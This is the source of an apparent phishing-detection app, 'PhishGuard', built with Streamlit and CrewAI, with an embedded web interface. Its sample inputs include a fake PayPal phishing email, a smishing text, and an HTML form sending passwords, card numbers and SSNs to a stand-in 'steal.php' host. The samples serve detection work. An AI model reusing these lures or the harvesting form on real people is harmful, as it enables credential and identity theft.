import os
import streamlit as st
import pandas as pd
from dotenv import load_dotenv
from crewai import Agent, Task, Crew, LLM
import streamlit.components.v1 as components
import threading
import json
import http.server
import socketserver
import re
from datetime import datetime

# ==========================================
# 1. SETUP & LIBRARIES (Arranged like example.py)
# ==========================================
load_dotenv()
api_key = os.getenv("OPENROUTER_API_KEY")
if not api_key:
    try:
        with open(".openrouter_key", "r", encoding="utf-8") as kf:
            api_key = kf.read().strip()
    except Exception:
        pass

if not api_key:
    st.error("Missing OPENROUTER_API_KEY in .env file or .openrouter_key file")
    st.stop()

# ==========================================
# 2. CREWAI BACKEND LOGIC
# ==========================================
def analyze_with_crewai(user_content: str, model_name: str) -> dict:
    llm = LLM(
        model=f"openrouter/{model_name}" if not model_name.startswith("openrouter/") else model_name,
        api_key=api_key,
        base_url="https://openrouter.ai/api/v1",
        temperature=0.1
    )

    agent = Agent(
        role="PhishGuard AI Agent",
        goal="Analyze content for phishing indicators, social engineering tactics, and threats.",
        backstory=(
            "You are PhishGuard, an elite cybersecurity AI agent specializing in phishing detection and analysis. "
            "You MUST respond in strict JSON format with exactly these keys: verdict (PHISHING, SUSPICIOUS, LEGITIMATE, UNKNOWN), "
            "confidence (0-100), risk_level (CRITICAL, HIGH, MEDIUM, LOW, NONE), summary (1 sentence), "
            "indicators (list of objects with type, description, severity), tactics (list of strings), "
            "recommendations (list of strings), and detailed_analysis (paragraph)."
        ),
        verbose=True,
        allow_delegation=False,
        llm=llm
    )

    task = Task(
        description=f"Perform a comprehensive phishing analysis on the following content:\n\n{user_content}\n\nRespond ONLY with a valid JSON object matching the requested schema.",
        expected_output="JSON object with the phishing analysis",
        agent=agent
    )

    crew = Crew(agents=[agent], tasks=[task], verbose=True)
    result = crew.kickoff()
    
    raw = result.raw
    try:
        analysis = json.loads(raw)
    except json.JSONDecodeError:
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            analysis = json.loads(match.group())
        else:
            raise ValueError("Model did not return valid JSON")
            
    analysis["model_used"] = model_name
    analysis["timestamp"] = datetime.utcnow().isoformat() + "Z"
    return {"success": True, "analysis": analysis}

# ==========================================
# 3. HTTP SERVER (Runs in background)
# ==========================================
class PhishGuardHandler(http.server.SimpleHTTPRequestHandler):
    def send_json(self, data: dict, status: int = 200):
        body = json.dumps(data, indent=2).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        if self.path == "/health":
            self.send_json({"status": "ok"})
        else:
            self.send_json({"error": "Not found"}, 404)

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(content_length).decode("utf-8")
        try:
            body = json.loads(raw_body)
        except json.JSONDecodeError:
            self.send_json({"success": False, "error": "Invalid JSON"}, 400)
            return

        model = body.get("model", "google/gemini-2.0-flash-001")
        
        try:
            if self.path == "/analyze/email":
                subject, sender = body.get("subject", ""), body.get("sender", "")
                email_body, headers = body.get("body", ""), body.get("headers", "")
                content = f"From: {sender}\nSubject: {subject}\nHeaders: {headers}\nBody: {email_body}"
                self.send_json(analyze_with_crewai(content, model))
            elif self.path == "/analyze/url":
                url, context = body.get("url", ""), body.get("context", "")
                self.send_json(analyze_with_crewai(f"URL: {url}\nContext: {context}", model))
            elif self.path == "/analyze/message":
                text, platform = body.get("text", ""), body.get("platform", "Unknown")
                self.send_json(analyze_with_crewai(f"Platform: {platform}\nMessage: {text}", model))
            elif self.path == "/analyze/raw":
                self.send_json(analyze_with_crewai(body.get("content", ""), model))
            else:
                self.send_json({"error": "Unknown endpoint"}, 404)
        except Exception as e:
            self.send_json({"success": False, "error": str(e)}, 500)

if "server_thread" not in st.session_state:
    def start_server():
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(("0.0.0.0", 8080), PhishGuardHandler) as httpd:
            httpd.serve_forever()
    t = threading.Thread(target=start_server, daemon=True)
    t.start()
    st.session_state.server_thread = t

# ==========================================
# 4. STREAMLIT UI WITH EMBEDDED HTML
# ==========================================
st.set_page_config(page_title="PhishGuard AI Agent", layout="wide")

HTML_CODE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>PhishGuard — AI Phishing Analysis Agent</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
<style>
  :root {
    --bg: #080c10;
    --surface: #0d1117;
    --surface2: #131920;
    --border: #1e2d3d;
    --border2: #243447;
    --accent: #00e5ff;
    --accent2: #0091ea;
    --danger: #ff1744;
    --warn: #ff9100;
    --ok: #00e676;
    --text: #e2eaf4;
    --muted: #5a7a9a;
    --mono: 'Space Mono', monospace;
    --sans: 'Syne', sans-serif;
    --glow: 0 0 20px rgba(0,229,255,0.15);
    --glow-danger: 0 0 20px rgba(255,23,68,0.2);
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--sans);
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* ── GRID BACKGROUND ── */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  /* ── HEADER ── */
  header {
    position: relative;
    z-index: 10;
    padding: 28px 40px;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: space-between;
    backdrop-filter: blur(10px);
    background: rgba(8,12,16,0.8);
  }

  .logo {
    display: flex;
    align-items: center;
    gap: 14px;
  }
  .logo-icon {
    width: 42px; height: 42px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    border-radius: 10px;
    display: flex; align-items: center; justify-content: center;
    font-size: 20px;
    box-shadow: var(--glow);
    flex-shrink: 0;
  }
  .logo-text {
    font-size: 22px;
    font-weight: 800;
    letter-spacing: -0.5px;
    color: var(--text);
  }
  .logo-sub {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--muted);
    letter-spacing: 1.5px;
    text-transform: uppercase;
    margin-top: 1px;
  }

  .status-dot {
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: var(--mono);
    font-size: 12px;
    color: var(--ok);
  }
  .dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--ok);
    box-shadow: 0 0 8px var(--ok);
    animation: pulse 2s ease-in-out infinite;
  }
  @keyframes pulse {
    0%,100% { opacity: 1; } 50% { opacity: 0.4; }
  }

  /* ── LAYOUT ── */
  .main {
    position: relative;
    z-index: 5;
    max-width: 1200px;
    margin: 0 auto;
    padding: 40px 24px 60px;
  }

  /* ── TAB NAV ── */
  .tabs {
    display: flex;
    gap: 4px;
    margin-bottom: 32px;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 6px;
  }
  .tab {
    flex: 1;
    padding: 10px 12px;
    border: none;
    background: transparent;
    color: var(--muted);
    font-family: var(--sans);
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    border-radius: 8px;
    transition: all 0.2s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
  .tab:hover { color: var(--text); background: var(--surface2); }
  .tab.active {
    background: linear-gradient(135deg, rgba(0,229,255,0.15), rgba(0,145,234,0.1));
    color: var(--accent);
    border: 1px solid rgba(0,229,255,0.2);
  }

  /* ── PANELS ── */
  .panel { display: none; }
  .panel.active { display: block; }

  /* ── FORM CARD ── */
  .card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 28px;
    margin-bottom: 24px;
  }
  .card-title {
    font-size: 13px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .card-title::after {
    content: '';
    flex: 1;
    height: 1px;
    background: var(--border);
  }

  .form-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
  }
  .form-grid.full { grid-template-columns: 1fr; }
  @media(max-width:680px) { .form-grid { grid-template-columns: 1fr; } }

  .field { display: flex; flex-direction: column; gap: 8px; }
  .field.span2 { grid-column: span 2; }
  @media(max-width:680px) { .field.span2 { grid-column: span 1; } }

  label {
    font-family: var(--mono);
    font-size: 11px;
    letter-spacing: 1px;
    text-transform: uppercase;
    color: var(--muted);
  }

  input, textarea, select {
    background: var(--bg);
    border: 1px solid var(--border2);
    border-radius: 8px;
    padding: 12px 14px;
    color: var(--text);
    font-family: var(--mono);
    font-size: 13px;
    transition: border-color 0.2s, box-shadow 0.2s;
    outline: none;
    width: 100%;
  }
  input:focus, textarea:focus, select:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(0,229,255,0.08);
  }
  textarea { resize: vertical; min-height: 120px; line-height: 1.6; }
  select option { background: var(--surface); }

  /* ── MODEL SELECTOR ── */
  .model-row {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 20px;
    flex-wrap: wrap;
  }
  .model-row label { margin: 0; white-space: nowrap; }
  .model-row select { flex: 1; min-width: 200px; }

  /* ── ANALYZE BUTTON ── */
  .btn-analyze {
    width: 100%;
    padding: 16px;
    background: linear-gradient(135deg, #00e5ff, #0091ea);
    border: none;
    border-radius: 10px;
    color: #000;
    font-family: var(--sans);
    font-size: 15px;
    font-weight: 800;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: all 0.2s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-top: 8px;
  }
  .btn-analyze:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(0,229,255,0.3); }
  .btn-analyze:active { transform: translateY(0); }
  .btn-analyze:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

  /* ── SPINNER ── */
  .spinner {
    width: 18px; height: 18px;
    border: 2px solid rgba(0,0,0,0.3);
    border-top-color: #000;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    display: none;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* ── RESULTS ── */
  #results { display: none; }

  .verdict-banner {
    border-radius: 16px;
    padding: 28px 32px;
    display: flex;
    align-items: center;
    gap: 24px;
    margin-bottom: 20px;
    position: relative;
    overflow: hidden;
  }
  .verdict-banner::before {
    content: '';
    position: absolute;
    inset: 0;
    opacity: 0.06;
    background: radial-gradient(ellipse at 20% 50%, currentColor, transparent 60%);
  }
  .verdict-banner.PHISHING  { background: rgba(255,23,68,0.1);  border: 1px solid rgba(255,23,68,0.3);  color: #ff1744; }
  .verdict-banner.SUSPICIOUS{ background: rgba(255,145,0,0.1); border: 1px solid rgba(255,145,0,0.3); color: #ff9100; }
  .verdict-banner.LEGITIMATE{ background: rgba(0,230,118,0.08); border: 1px solid rgba(0,230,118,0.3); color: #00e676; }
  .verdict-banner.UNKNOWN   { background: rgba(90,122,154,0.1); border: 1px solid rgba(90,122,154,0.3); color: #5a7a9a; }

  .verdict-icon { font-size: 48px; flex-shrink: 0; }
  .verdict-info { flex: 1; }
  .verdict-label {
    font-size: 32px;
    font-weight: 800;
    letter-spacing: -1px;
    line-height: 1;
    margin-bottom: 6px;
  }
  .verdict-summary {
    font-size: 15px;
    opacity: 0.85;
    font-weight: 400;
    color: var(--text);
    line-height: 1.5;
  }

  .verdict-meta {
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    gap: 8px;
    flex-shrink: 0;
  }
  .confidence-ring {
    position: relative;
    width: 72px;
    height: 72px;
  }
  .confidence-ring svg { transform: rotate(-90deg); }
  .confidence-ring .ring-val {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: var(--mono);
    font-size: 15px;
    font-weight: 700;
    color: var(--text);
  }
  .risk-badge {
    font-family: var(--mono);
    font-size: 10px;
    font-weight: 700;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    padding: 5px 10px;
    border-radius: 20px;
    border: 1px solid currentColor;
    background: rgba(0,0,0,0.3);
  }

  /* ── RESULTS GRID ── */
  .results-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
    margin-bottom: 16px;
  }
  @media(max-width:768px) { .results-grid { grid-template-columns: 1fr; } }

  .result-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
  }
  .result-card.span2 { grid-column: span 2; }
  @media(max-width:768px) { .result-card.span2 { grid-column: span 1; } }

  .result-card h3 {
    font-family: var(--mono);
    font-size: 11px;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 14px;
    padding-bottom: 10px;
    border-bottom: 1px solid var(--border);
  }

  /* ── INDICATORS ── */
  .indicator {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    padding: 10px 0;
    border-bottom: 1px solid var(--border);
  }
  .indicator:last-child { border-bottom: none; }
  .ind-sev {
    font-family: var(--mono);
    font-size: 9px;
    font-weight: 700;
    letter-spacing: 1px;
    padding: 3px 7px;
    border-radius: 4px;
    flex-shrink: 0;
    margin-top: 2px;
  }
  .ind-sev.HIGH   { background: rgba(255,23,68,0.2);  color: #ff1744; }
  .ind-sev.MEDIUM { background: rgba(255,145,0,0.2); color: #ff9100; }
  .ind-sev.LOW    { background: rgba(90,122,154,0.2); color: #8aa8c4; }
  .ind-content {}
  .ind-type {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--accent);
    margin-bottom: 2px;
  }
  .ind-desc { font-size: 13px; color: var(--text); line-height: 1.5; }

  /* ── TACTICS ── */
  .tactic-chip {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    padding: 5px 12px;
    background: rgba(0,229,255,0.06);
    border: 1px solid rgba(0,229,255,0.15);
    border-radius: 20px;
    font-family: var(--mono);
    font-size: 11px;
    color: var(--accent);
    margin: 3px;
  }

  /* ── RECOMMENDATIONS ── */
  .rec-item {
    display: flex;
    gap: 10px;
    padding: 9px 0;
    border-bottom: 1px solid var(--border);
    font-size: 13px;
    line-height: 1.5;
    color: var(--text);
  }
  .rec-item:last-child { border-bottom: none; }
  .rec-num {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--ok);
    flex-shrink: 0;
    margin-top: 1px;
  }

  /* ── DETAILED ANALYSIS ── */
  .detailed-text {
    font-size: 14px;
    line-height: 1.8;
    color: #b0c8e0;
  }

  /* ── META ROW ── */
  .meta-row {
    display: flex;
    gap: 20px;
    padding: 12px 16px;
    background: var(--surface2);
    border: 1px solid var(--border);
    border-radius: 8px;
    font-family: var(--mono);
    font-size: 11px;
    color: var(--muted);
    flex-wrap: wrap;
  }
  .meta-row span strong { color: var(--text); }

  /* ── ERROR ── */
  .error-box {
    background: rgba(255,23,68,0.08);
    border: 1px solid rgba(255,23,68,0.25);
    border-radius: 12px;
    padding: 20px;
    color: #ff6b8a;
    font-family: var(--mono);
    font-size: 13px;
    display: none;
  }

  /* ── HISTORY ── */
  .history-item {
    display: flex;
    align-items: center;
    gap: 14px;
    padding: 14px 16px;
    background: var(--surface2);
    border: 1px solid var(--border);
    border-radius: 10px;
    margin-bottom: 8px;
    cursor: pointer;
    transition: border-color 0.2s;
  }
  .history-item:hover { border-color: var(--border2); }
  .hist-verdict-dot {
    width: 10px; height: 10px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .hist-info { flex: 1; min-width: 0; }
  .hist-title { font-size: 13px; font-weight: 600; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .hist-sub { font-family: var(--mono); font-size: 10px; color: var(--muted); margin-top: 2px; }
  .hist-verdict { font-family: var(--mono); font-size: 11px; font-weight: 700; }

  /* ── SCROLLBAR ── */
  ::-webkit-scrollbar { width: 6px; }
  ::-webkit-scrollbar-track { background: var(--bg); }
  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }

  /* ── SECTION TITLE ── */
  .section-title {
    font-size: 26px;
    font-weight: 800;
    letter-spacing: -0.5px;
    margin-bottom: 6px;
  }
  .section-desc {
    font-size: 14px;
    color: var(--muted);
    margin-bottom: 28px;
    font-family: var(--mono);
  }

  /* ── LOADING OVERLAY ── */
  #loading {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(8,12,16,0.85);
    z-index: 1000;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    gap: 16px;
    backdrop-filter: blur(4px);
  }
  #loading.show { display: flex; }
  .loading-ring {
    width: 64px; height: 64px;
    border: 3px solid var(--border2);
    border-top-color: var(--accent);
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  .loading-text {
    font-family: var(--mono);
    font-size: 13px;
    color: var(--muted);
    animation: blink 1.2s ease-in-out infinite;
  }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }

  /* Sample data button */
  .btn-sample {
    padding: 7px 14px;
    background: transparent;
    border: 1px solid var(--border2);
    border-radius: 6px;
    color: var(--muted);
    font-family: var(--mono);
    font-size: 11px;
    cursor: pointer;
    transition: all 0.2s;
  }
  .btn-sample:hover { border-color: var(--accent); color: var(--accent); }
</style>
</head>
<body>

<!-- ── LOADING OVERLAY ── -->
<div id="loading">
  <div class="loading-ring"></div>
  <div class="loading-text">ANALYZING THREAT VECTORS...</div>
</div>

<!-- ── HEADER ── -->
<header>
  <div class="logo">
    <div class="logo-icon">🛡️</div>
    <div>
      <div class="logo-text">PhishGuard</div>
      <div class="logo-sub">AI Phishing Analysis Agent</div>
    </div>
  </div>
  <div class="status-dot">
    <div class="dot"></div>
    <span id="statusLabel">ONLINE</span>
  </div>
</header>

<!-- ── MAIN ── -->
<div class="main">

  <!-- Tabs -->
  <div class="tabs">
    <button class="tab active" onclick="switchTab('email', this)">📧 Email</button>
    <button class="tab" onclick="switchTab('url', this)">🔗 URL</button>
    <button class="tab" onclick="switchTab('message', this)">💬 Message</button>
    <button class="tab" onclick="switchTab('raw', this)">📋 Raw Input</button>
    <button class="tab" onclick="switchTab('history', this)">🕒 History</button>
  </div>

  <!-- ── MODEL SELECTOR (global) ── -->
  <div class="model-row">
    <label>🤖 Model</label>
    <select id="modelSelect">
      <option value="google/gemini-2.0-flash-001">Gemini 2.0 Flash (Default — Fast)</option>
      <option value="anthropic/claude-3.5-sonnet">Claude 3.5 Sonnet</option>
      <option value="openai/gpt-4o">GPT-4o</option>
      <option value="meta-llama/llama-3.3-70b-instruct">Llama 3.3 70B</option>
      <option value="mistralai/mistral-large">Mistral Large</option>
    </select>
  </div>

  <!-- ════════════ EMAIL PANEL ════════════ -->
  <div id="panel-email" class="panel active">
    <div class="section-title">Email Analysis</div>
    <div class="section-desc">// Paste email content to detect phishing, BEC, or spoofing</div>

    <div class="card">
      <div class="card-title">📧 Email Details</div>
      <div class="form-grid">
        <div class="field">
          <label>Sender Address</label>
          <input type="text" id="e-sender" placeholder="support@paypa1.com"/>
        </div>
        <div class="field">
          <label>Subject Line</label>
          <input type="text" id="e-subject" placeholder="Urgent: Your account has been suspended"/>
        </div>
        <div class="field span2">
          <label>Email Body</label>
          <textarea id="e-body" rows="6" placeholder="Paste the full email body here..."></textarea>
        </div>
        <div class="field span2">
          <label>Raw Headers (optional)</label>
          <textarea id="e-headers" rows="4" placeholder="Received: from mail.suspicious.ru&#10;X-Originating-IP: 192.168.1.1&#10;..."></textarea>
        </div>
      </div>
      <div style="display:flex;gap:10px;margin-top:8px">
        <button class="btn-sample" onclick="loadSample('email')">Load sample phishing email</button>
        <button class="btn-analyze" onclick="runAnalysis('email')">
          <div class="spinner" id="spinner-email"></div>
          <span>🔍 Analyze Email</span>
        </button>
      </div>
    </div>
  </div>

  <!-- ════════════ URL PANEL ════════════ -->
  <div id="panel-url" class="panel">
    <div class="section-title">URL Analysis</div>
    <div class="section-desc">// Detect typosquatting, malicious redirects, and lookalike domains</div>

    <div class="card">
      <div class="card-title">🔗 URL Details</div>
      <div class="form-grid full">
        <div class="field">
          <label>URL or Link</label>
          <input type="text" id="u-url" placeholder="https://paypa1-secure.com/login?redirect=http://evil.ru"/>
        </div>
        <div class="field">
          <label>Context (optional)</label>
          <textarea id="u-context" rows="3" placeholder="Where was this link found? e.g. 'Received in an email claiming to be from PayPal'"></textarea>
        </div>
      </div>
      <div style="display:flex;gap:10px;margin-top:8px">
        <button class="btn-sample" onclick="loadSample('url')">Load sample URL</button>
        <button class="btn-analyze" onclick="runAnalysis('url')">
          <span>🔍 Analyze URL</span>
        </button>
      </div>
    </div>
  </div>

  <!-- ════════════ MESSAGE PANEL ════════════ -->
  <div id="panel-message" class="panel">
    <div class="section-title">Message Analysis</div>
    <div class="section-desc">// Analyze SMS, WhatsApp, Slack, or any chat message</div>

    <div class="card">
      <div class="card-title">💬 Message Details</div>
      <div class="form-grid full">
        <div class="field">
          <label>Platform</label>
          <select id="m-platform">
            <option>SMS</option>
            <option>WhatsApp</option>
            <option>Telegram</option>
            <option>Slack</option>
            <option>Email</option>
            <option>LinkedIn</option>
            <option>Facebook</option>
            <option>Twitter/X</option>
            <option>Unknown</option>
          </select>
        </div>
        <div class="field">
          <label>Message Text</label>
          <textarea id="m-text" rows="6" placeholder="Paste the suspicious message here..."></textarea>
        </div>
      </div>
      <div style="display:flex;gap:10px;margin-top:8px">
        <button class="btn-sample" onclick="loadSample('message')">Load sample SMS</button>
        <button class="btn-analyze" onclick="runAnalysis('message')">
          <span>🔍 Analyze Message</span>
        </button>
      </div>
    </div>
  </div>

  <!-- ════════════ RAW PANEL ════════════ -->
  <div id="panel-raw" class="panel">
    <div class="section-title">Raw Content Analysis</div>
    <div class="section-desc">// Paste anything — HTML source, headers, logs, or mixed content</div>

    <div class="card">
      <div class="card-title">📋 Raw Content</div>
      <div class="form-grid full">
        <div class="field">
          <label>Content to Analyze</label>
          <textarea id="r-content" rows="12" placeholder="Paste raw content here — HTML source, email headers, log excerpts, or any suspicious text..."></textarea>
        </div>
      </div>
      <div style="display:flex;gap:10px;margin-top:8px">
        <button class="btn-sample" onclick="loadSample('raw')">Load sample HTML phish</button>
        <button class="btn-analyze" onclick="runAnalysis('raw')">
          <span>🔍 Analyze Content</span>
        </button>
      </div>
    </div>
  </div>

  <!-- ════════════ HISTORY PANEL ════════════ -->
  <div id="panel-history" class="panel">
    <div class="section-title">Analysis History</div>
    <div class="section-desc">// Your recent analyses this session</div>
    <div id="historyList">
      <div style="color:var(--muted);font-family:var(--mono);font-size:13px;padding:20px 0">No analyses yet. Run your first scan above.</div>
    </div>
  </div>

  <!-- ── ERROR BOX ── -->
  <div class="error-box" id="errorBox"></div>

  <!-- ════════════ RESULTS ════════════ -->
  <div id="results">

    <!-- Verdict Banner -->
    <div class="verdict-banner" id="verdictBanner">
      <div class="verdict-icon" id="verdictIcon"></div>
      <div class="verdict-info">
        <div class="verdict-label" id="verdictLabel"></div>
        <div class="verdict-summary" id="verdictSummary"></div>
      </div>
      <div class="verdict-meta">
        <div class="confidence-ring">
          <svg viewBox="0 0 72 72" width="72" height="72">
            <circle cx="36" cy="36" r="30" fill="none" stroke="rgba(255,255,255,0.08)" stroke-width="5"/>
            <circle cx="36" cy="36" r="30" fill="none" stroke="currentColor" stroke-width="5"
              stroke-dasharray="188.5" id="confCircle" stroke-dashoffset="188.5"
              stroke-linecap="round" style="transition:stroke-dashoffset 1s ease"/>
          </svg>
          <div class="ring-val" id="confVal">0%</div>
        </div>
        <div class="risk-badge" id="riskBadge"></div>
      </div>
    </div>

    <!-- Indicators + Tactics -->
    <div class="results-grid">
      <div class="result-card" id="indicatorsCard">
        <h3>⚠️ Threat Indicators</h3>
        <div id="indicatorsList"></div>
      </div>
      <div class="result-card" style="display:flex;flex-direction:column;gap:16px">
        <div>
          <h3>🎯 Attack Tactics</h3>
          <div id="tacticsList" style="margin-top:4px"></div>
        </div>
        <div>
          <h3>✅ Recommendations</h3>
          <div id="recsList"></div>
        </div>
      </div>

      <div class="result-card span2">
        <h3>🔎 Detailed Analysis</h3>
        <div class="detailed-text" id="detailedText"></div>
      </div>
    </div>

    <!-- Meta row -->
    <div class="meta-row" id="metaRow"></div>
  </div>

</div><!-- /main -->

<script>
const API_BASE = 'http://localhost:8080';
let analysisHistory = [];

// ── TAB SWITCHING ──────────────────────────
function switchTab(tab, btn) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.getElementById('panel-' + tab).classList.add('active');
  btn.classList.add('active');
  if (tab !== 'history') {
    document.getElementById('results').style.display = 'none';
    document.getElementById('errorBox').style.display = 'none';
  }
}

// ── LOADING STATE ──────────────────────────
function setLoading(on) {
  const overlay = document.getElementById('loading');
  if (on) overlay.classList.add('show'); else overlay.classList.remove('show');
}

// ── SAMPLE DATA ────────────────────────────
const samples = {
  email: {
    sender: 'security-alert@paypa1-secure.com',
    subject: '⚠️ URGENT: Your PayPal account has been LIMITED – Verify now!',
    body: `Dear Valued Customer,

We have detected unusual activity on your PayPal account. To prevent unauthorized access and protect your funds, we have temporarily limited your account.

To restore full access, you must verify your identity within 24 hours by clicking the link below:

👉 VERIFY MY ACCOUNT NOW: http://paypa1-secure.com/verify?token=abc123&redirect=login

If you do not verify within 24 hours, your account will be PERMANENTLY SUSPENDED and all pending transactions will be reversed.

What to do next:
1. Click the verification link above
2. Enter your full name, date of birth, and SSN
3. Provide your credit card details for identity verification

PayPal Security Team
security@paypal.com`,
    headers: `Received: from mail.suspicious-host.ru (192.168.77.5)
X-Originating-IP: 192.168.77.5
Reply-To: collect@data-harvest.ru
X-Mailer: PHPMailer 5.2.1`
  },
  url: {
    url: 'https://paypa1-secure-login.com.ru/account/verify?redirect=http://evil-collector.xyz/steal',
    context: 'Found in an email claiming to be from PayPal, asking to verify account urgently.'
  },
  message: {
    platform: 'SMS',
    text: 'BANK ALERT: Your Chase account has been LOCKED due to suspicious activity. Click HERE to unlock: http://chase-secure-unlock.xyz/a7f2 or call 1-800-555-FAKE. Respond Y to confirm receipt.'
  },
  raw: {
    content: `<html>
<body style="background:#003087">
<img src="https://www.paypal.com/en_US/i/logo/PayPal_mark_60x38.gif">
<h2 style="color:white">Confirm Your Information</h2>
<form action="http://data-collector.ru/steal.php" method="POST">
  Email: <input name="email" type="email"><br>
  Password: <input name="password" type="password"><br>
  Credit Card: <input name="cc"><br>
  SSN: <input name="ssn"><br>
  <button>Submit</button>
</form>
<!-- src: http://paypa1-secure.xyz/login -->
</body>
</html>`
  }
};

function loadSample(type) {
  const s = samples[type];
  if (type === 'email') {
    document.getElementById('e-sender').value = s.sender;
    document.getElementById('e-subject').value = s.subject;
    document.getElementById('e-body').value = s.body;
    document.getElementById('e-headers').value = s.headers;
  } else if (type === 'url') {
    document.getElementById('u-url').value = s.url;
    document.getElementById('u-context').value = s.context;
  } else if (type === 'message') {
    document.getElementById('m-platform').value = s.platform;
    document.getElementById('m-text').value = s.text;
  } else if (type === 'raw') {
    document.getElementById('r-content').value = s.content;
  }
}

// ── MAIN ANALYSIS RUNNER ───────────────────
async function runAnalysis(type) {
  const model = document.getElementById('modelSelect').value;

  let endpoint, payload, label;

  if (type === 'email') {
    const sender  = document.getElementById('e-sender').value.trim();
    const subject = document.getElementById('e-subject').value.trim();
    const body    = document.getElementById('e-body').value.trim();
    const headers = document.getElementById('e-headers').value.trim();
    if (!body && !subject && !sender) return alert('Please fill in at least one field.');
    endpoint = '/analyze/email';
    payload  = { sender, subject, body, headers, model };
    label = subject || sender || 'Email Analysis';
  } else if (type === 'url') {
    const url     = document.getElementById('u-url').value.trim();
    const context = document.getElementById('u-context').value.trim();
    if (!url) return alert('Please enter a URL.');
    endpoint = '/analyze/url';
    payload  = { url, context, model };
    label = url;
  } else if (type === 'message') {
    const text     = document.getElementById('m-text').value.trim();
    const platform = document.getElementById('m-platform').value;
    if (!text) return alert('Please enter message text.');
    endpoint = '/analyze/message';
    payload  = { text, platform, model };
    label = text.substring(0, 60) + (text.length > 60 ? '…' : '');
  } else if (type === 'raw') {
    const content = document.getElementById('r-content').value.trim();
    if (!content) return alert('Please enter content to analyze.');
    endpoint = '/analyze/raw';
    payload  = { content, model };
    label = 'Raw Content';
  }

  // Hide previous results
  document.getElementById('results').style.display = 'none';
  document.getElementById('errorBox').style.display = 'none';
  setLoading(true);

  try {
    const res = await fetch(API_BASE + endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await res.json();
    setLoading(false);

    if (!data.success) {
      showError(data.error + (data.details ? '\n\n' + data.details : ''));
      return;
    }

    renderResults(data.analysis);
    saveHistory(label, data.analysis, type);

  } catch (err) {
    setLoading(false);
    showError('Network error: ' + err.message + '\n\nMake sure the server is running on port 8080.');
  }
}

// ── RENDER RESULTS ─────────────────────────
function renderResults(a) {
  const verdict = (a.verdict || 'UNKNOWN').toUpperCase();
  const risk    = (a.risk_level || 'NONE').toUpperCase();
  const conf    = Math.min(100, Math.max(0, parseInt(a.confidence) || 0));

  const icons  = { PHISHING:'🚨', SUSPICIOUS:'⚠️', LEGITIMATE:'✅', UNKNOWN:'❓' };
